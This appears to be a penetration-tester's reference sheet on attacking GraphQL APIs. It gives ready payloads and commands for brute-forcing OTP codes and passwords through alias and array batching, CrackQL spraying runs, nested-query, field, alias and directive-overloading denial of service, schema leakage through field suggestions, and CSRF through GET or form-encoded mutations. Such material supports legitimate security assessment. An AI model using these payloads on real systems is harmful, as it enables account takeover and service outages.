# Batching abuse, DoS primitives, CrackQL

## Array batching vs aliased-query batching

**Array batching** — one HTTP request, a JSON array of operation objects; the
server executes each and returns an array of results:

```http
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json

[{"query":"mutation{login(username:\"admin\",password:\"a\"){token}}"},
 {"query":"mutation{login(username:\"admin\",password:\"b\"){token}}"},
 {"query":"mutation{login(username:\"admin\",password:\"c\"){token}}"}]
```

Response: `[{"data":...},{"data":...},{"data":...}]`. Supported by Apollo
(batching enabled), graphql-ruby, graphql-php, Hasura, others. Many WAFs and
rate limiters count this as **one** request.

**Aliased-query batching** — one *document*, N aliased invocations of the same
field. Aliases are core GraphQL spec, so this works even where array batching
is disabled:

```graphql
mutation {
  a0: verifyOTP(user:"admin", code:"0000") { ok token }
  a1: verifyOTP(user:"admin", code:"0001") { ok token }
  a2: verifyOTP(user:"admin", code:"0002") { ok token }
  # ... a4999: ...
}
```

Response data keys are the aliases: scan for the alias whose value is non-null
/ lacks a matching entry in `errors[].path` — that's the hit.

### Why it bypasses rate limits

Per-request counters (nginx limit_req, API gateways, express-rate-limit,
account-lockout-per-attempt implementations keyed on HTTP requests) increment
once per HTTP request. 10k OTP guesses in 2 requests of 5k aliases = 2 ticks
of the counter. Targets: 4-6 digit OTP/2FA codes, password spray (fixed
password × many usernames to dodge lockout), promo/coupon redemption, poll
stuffing, SMS-send cost amplification.

Practical chunk sizes: start at 100 aliases, grow to 1000-5000; servers cap
on body size (often 1-8 MB) or token count before alias count. If the server
rejects, binary-search the max chunk. `scripts/batch_build.py --chunk N`
handles the splitting and result parsing.

Mutations execute **serially** per spec (queries in parallel) — alias-batched
mutations still all run, just in order.

## CrackQL (nicholasaleks/CrackQL)

Purpose-built brute-forcer that compiles a CSV of values into alias batches:

```bash
# password spraying
python3 CrackQL.py -t https://api.example.com/graphql \
  -q sample-queries/login.graphql -i sample-inputs/usernames_and_passwords.csv -b 100

# OTP bypass
python3 CrackQL.py -t https://api.example.com/graphql \
  -q otp.graphql -i otp-codes.csv -b 500 -o results/
```

- `-q` query template using Jinja-style variables matching CSV columns, e.g.
  `mutation { login(username: {{username|str}}, password: {{password|str}}) { token } }`
- `-i` CSV input (header row = variable names), `-b` batch size (aliases per
  request), `-o` output dir (JSON + CSV of per-alias results), `-D` delay
  between batches, `--verbose`.

It auto-aliases each CSV row, sends, and correlates alias → input row in the
results, including per-alias errors — read `results.json` for rows whose
response had data and no error.

## Nested / deep query DoS (cyclic types)

Find a cycle in the schema (Voyager makes them visible): `Thread.posts:
[Post]` and `Post.thread: Thread`. Nesting multiplies resolver fan-out:

```graphql
query {
  thread(id:1) {
    posts(first:100) { thread { posts(first:100) { thread {
      posts(first:100) { id } } } } }
  }
}
```

Depth d with fan-out k ≈ k^d resolver calls. Methodology: send depth 3, 5, 7,
10; record response times; stop when you've shown super-linear growth (e.g.
200ms → 2s → 20s). That curve *is* the evidence — include timings in the
finding instead of knocking the service over. Connection-style pagination args
(`first: 1000`) multiply the effect. Circular **fragments** are a variant:
two fragments referencing each other are rejected by compliant parsers, but
graphql-cop's "circular introspection" check finds servers where
introspection types (`__Type.ofType`, `fields.type.fields...`) can be cycled
for the same effect without needing the app schema.

## Field duplication DoS

The same field repeated many times in one selection set — compliant servers
dedupe, careless ones resolve each:

```graphql
query { me { id id id id id ... (x10000) } }
```

Generate: `python3 -c 'print("query{me{"+"id "*10000+"}}")'`. Response-time
delta vs single-field baseline is the evidence.

## Alias overloading DoS

Same as the brute-force primitive but aimed at cost: thousands of aliases of
an *expensive* query (search, aggregation, nested connection) in one document.

## Directive overloading DoS

Repeat a directive thousands of times on one field — the validator processes
every one before execution:

```graphql
query { __typename @aa@aa@aa@aa... }        # unknown directives
query { me { id @skip(if:false)@skip(if:false)... } }
```

Generate: `python3 -c 'print("query{__typename"+"@aa"*20000+"}")'`.
Vulnerable engines burn CPU in parse/validate; fixed ones cap directive count
(this was a real class of advisories across graphql-php, graphql-ruby, and
others).

## Field-suggestion information disclosure

With introspection off:

```bash
curl -sk -X POST https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{usr{id}}"}'
# "Cannot query field \"usr\" on type \"Query\". Did you mean \"user\" or \"users\"?"
```

Each typo leaks siblings. Alone it's informational; as the enabler of a full
clairvoyance schema recovery it belongs in that finding's chain of evidence.

## GraphQL CSRF

Preconditions: cookie-based session, no CSRF token, and one of:

- queries/mutations accepted over **GET** → `<img src="https://api.example.com/graphql?query=mutation{...}">`
- **`application/x-www-form-urlencoded`** POST accepted (no CORS preflight)
  → auto-submitting HTML form with `query=` (and optionally `variables=`)
  fields.

graphql-cop's "GET method query support", "Mutation over GET", and "POST
urlencoded" checks identify the preconditions; the exploit is a hosted PoC
page that performs a state-changing mutation (email change, token mint) in a
victim's browser. Capture the resulting authenticated exchange as evidence.
